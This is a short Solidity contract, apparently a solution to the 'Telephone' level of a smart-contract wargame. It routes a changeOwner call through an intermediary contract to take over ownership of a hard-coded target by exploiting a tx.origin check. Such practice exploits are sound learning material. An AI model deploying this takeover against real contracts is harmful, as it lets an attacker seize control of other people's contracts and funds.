// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.2 <0.9.0;

/**
 * @title Attack contract for Telephone level
 * @author DappScout
 * @notice 
 */
contract Attack4 {

    address constant CONTRACT = 0xe70B20005119c844435078d5dD976f1f40809c50;

    ///@notice Funtion for automating the answer retriving and sending the call - manuall approach was too slow 
    function ownership(address newOwner) public {

    (bool success, bytes memory returnData) = CONTRACT.call{value: 0}(abi.encodeWithSelector(bytes4(keccak256("changeOwner(address)")), newOwner));

    }

}